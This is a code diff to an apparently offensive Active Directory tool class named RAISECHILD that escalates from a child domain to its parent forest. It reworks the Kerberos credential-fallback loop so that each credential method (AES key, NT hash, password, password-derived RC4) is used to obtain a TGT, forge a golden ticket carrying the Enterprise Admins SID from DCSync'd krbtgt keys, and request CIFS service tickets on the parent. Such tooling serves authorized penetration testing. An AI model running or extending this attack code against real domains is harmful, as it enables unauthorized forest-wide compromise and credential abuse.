@@ -1110,6 +1110,25 @@ class RAISECHILD:
 
         return encoder.encode(asRep), originalCipher, sessionKey
 
+    @staticmethod
+    def _has_credential_material(value):
+        return value not in (None, '', b'')
+
+    @staticmethod
+    def _get_rc4_retry_cred(childCreds):
+        if childCreds['password'] != '':
+            return {
+                'lmhash': LMOWFv1(childCreds['password']),
+                'nthash': NTOWFv1(childCreds['password']),
+                'aesKey': None,
+            }
+
+        return None
+
+    @staticmethod
+    def _same_rc4_creds(leftCreds, rightCreds):
+        return leftCreds['lmhash'] == rightCreds['lmhash'] and leftCreds['nthash'] == rightCreds['nthash']
+
     def raiseUp(self, childName, childCreds, parentName):
         logging.info('Raising %s to %s' % (childName, parentName))
 
@@ -1130,18 +1149,24 @@ class RAISECHILD:
         TGT = {}
         TGS = {}
 
-        # Build ordered list of credential attempts: AES first (modern DCs), then RC4, then password
+        # Build ordered list of end-to-end credential methods. Explicit key material goes first,
+        # then password, then an RC4 retry derived from the password if it would be distinct.
         credAttempts = []
-        if childCreds['aesKey'] is not None:
+        explicitRc4Cred = None
+        if self._has_credential_material(childCreds['aesKey']):
             credAttempts.append(('AES', {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
-        if childCreds['nthash'] != '':
-            credAttempts.append(('RC4', {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}))
+        if self._has_credential_material(childCreds['nthash']):
+            explicitRc4Cred = {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}
+            credAttempts.append(('RC4', explicitRc4Cred))
         if childCreds['password'] != '':
             credAttempts.append(('password', {'lmhash': b'', 'nthash': b'', 'aesKey': None}))
+            passwordRc4Cred = self._get_rc4_retry_cred(childCreds)
+            if passwordRc4Cred is not None and (
+                    explicitRc4Cred is None or not self._same_rc4_creds(passwordRc4Cred, explicitRc4Cred)):
+                credAttempts.append(('password->RC4', passwordRc4Cred))
         if not credAttempts:
             raise Exception('No credentials provided')
 
-        tgt = cipher = oldSessionKey = sessionKey = None
         for credType, cred in credAttempts:
             try:
                 logging.info('Trying %s for TGT request' % credType)
@@ -1149,7 +1174,6 @@ class RAISECHILD:
                                                                         childCreds['domain'], cred['lmhash'],
                                                                         cred['nthash'], cred['aesKey'], self.__kdcHost)
                 logging.info('TGT obtained using %s' % credType)
-                break
             except KerberosError as e:
                 if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value,
                                         constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
@@ -1157,28 +1181,12 @@ class RAISECHILD:
                     continue
                 else:
                     raise
-        if tgt is None:
-            raise Exception('Could not obtain TGT with any available credentials (tried: %s)' % ', '.join(c[0] for c in credAttempts))
-
-        # Track which krbtgt key type we're using for golden ticket forging
-        # Start with RC4, fall back to AES from DCSync'd krbtgt creds if available
-        goldenKeyAttempts = []
-        goldenKeyAttempts.append(('RC4', credentials['nthash'], credentials['aesKey'],
-                                  {'lmhash': childCreds['lmhash'], 'nthash': childCreds['nthash'], 'aesKey': None}))
-        if credentials['aesKey'] and credentials['aesKey'] != b'' and childCreds['aesKey'] is not None:
-            goldenKeyAttempts.append(('AES', credentials['nthash'], credentials['aesKey'],
-                                      {'lmhash': '', 'nthash': '', 'aesKey': childCreds['aesKey']}))
-
-        for goldenKeyType, ntHash, aesKey, childCred in goldenKeyAttempts:
-            # Re-obtain TGT with matching enctype for this golden ticket attempt
-            tgt2, cipher2, oldSessionKey2, sessionKey2 = getKerberosTGT(
-                userName, childCreds['password'], childCreds['domain'],
-                childCred['lmhash'], childCred['nthash'], childCred['aesKey'], self.__kdcHost)
-            goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt2, cipher2, sessionKey2, ntHash,
-                                                                           aesKey, entepriseSid + '-519')
+            goldenTicket, goldenCipher, goldenSessionKey = self.makeGolden(tgt, cipher, sessionKey,
+                                                                           credentials['nthash'], credentials['aesKey'],
+                                                                           entepriseSid + '-519')
             TGT['KDC_REP'] = goldenTicket
             TGT['cipher'] = goldenCipher
-            TGT['oldSessionKey'] = oldSessionKey2
+            TGT['oldSessionKey'] = oldSessionKey
             TGT['sessionKey'] = goldenSessionKey
 
             if self.__target is None:
@@ -1188,7 +1196,7 @@ class RAISECHILD:
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
             try:
                 logging.debug('Getting TGS for SPN %s' % serverName)
-                print('[*] Golden ticket etype: %s (using %s krbtgt key)' % (goldenCipher.enctype, goldenKeyType))
+                print('[*] Golden ticket etype: %s (using %s child credentials)' % (goldenCipher.enctype, credType))
                 print('[*] Requesting TGS for %s' % serverName)
                 tgsCIFS, cipherCIFS, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName,
                                                                                         childCreds['domain'], self.__kdcHost,
@@ -1204,14 +1212,15 @@ class RAISECHILD:
             except KerberosError as e:
                 if e.getErrorCode() in (constants.ErrorCodes.KDC_ERR_TGT_REVOKED.value,
                                         constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value):
-                    logging.warning('Golden ticket with %s key rejected (0x%x), trying next key type' % (goldenKeyType, e.getErrorCode()))
+                    logging.warning('Golden ticket built from %s child credentials rejected (0x%x), trying next method' % (
+                        credType, e.getErrorCode()))
                     continue
                 else:
                     raise
             else:
                 break
         else:
-            raise Exception('Golden ticket was rejected with all available krbtgt key types')
+            raise Exception('Golden ticket was rejected with all available child credential methods')
 
         # 6) Use the generated ticket to log into the parent and get the krbtgt/admin info
         # 6) Use the generated ticket to log into the parent and get the target-user info
